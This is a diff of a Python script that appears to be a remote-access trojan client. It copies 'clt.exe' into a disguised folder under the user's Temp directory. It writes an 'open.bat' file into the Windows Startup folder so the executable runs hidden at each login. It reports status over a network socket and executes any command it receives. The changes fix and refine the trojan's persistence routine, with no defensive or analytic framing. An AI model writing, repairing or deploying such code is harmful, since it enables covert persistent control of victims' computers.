@@ -16,7 +16,7 @@ from sys import argv
 USER = getuser()
 
 #used PATHS:
-temp_path = r'C:\Users\%s\AppData\Local\Temp' % USER
+temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
 #bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
 #file_path = path.dirname(path.realpath(__file__))
 
@@ -27,25 +27,24 @@ def kill():
 
 def clone():
     try:
-        os.mkdir(temp_path+"\\_TMP995858_atmpk")
+        path_to_create = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
+        if not os.path.exists(path_to_create):
+            os.makedirs(path_to_create)
+        fileToCopy = 'clt.exe'
+        shutil.copy2(fileToCopy, path_to_create)
     except:
+        msg = "error to create\copy...."
+        conn.send(msg.encode("utf-8"))
         pass
-
-    origin_arq = Path(path.dirname(path.realpath(__file__))+"\\clt.exe")
-    destini_dir = Path(temp_path+"\\_TMP995858_atmpk")
-    arq_Name = os.path.basename(origin_arq)
-    arq_dest = os.path.join(destini_dir, arq_Name)
-    shutil.copy(origin_arq, arq_dest)
-
-
 
 def bat_create(file_path=""):
     if(file_path == ""):
-        file_path = path.dirname(path.realpath(__file__))
+        #file_path = path.dirname(path.realpath(__file__))
+        file_path = temp_path
         bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-        bat_file.write(r'start "C:\Users\%s\AppData\Local\Temp\clt.exe" %s' % USER, file_path + "\\" + argv[0])
-        msg = "teste / .bat file created!"
+        bat_file.write(r'start /b %s\\clt.exe' % file_path)
+        msg = "[+] .bat file created!"
         conn.send(msg.encode("utf-8"))
         #src = Path(file_path)
         #dstn = Path(temp_path)
@@ -65,8 +64,8 @@ while True:
         while True:
             webbrowser.open_new(link)        
     if cmd == "stay":
-        clone()
         bat_create()
+        clone()
         #kill()
     os.system(cmd)
     output = subprocess.getoutput(cmd)
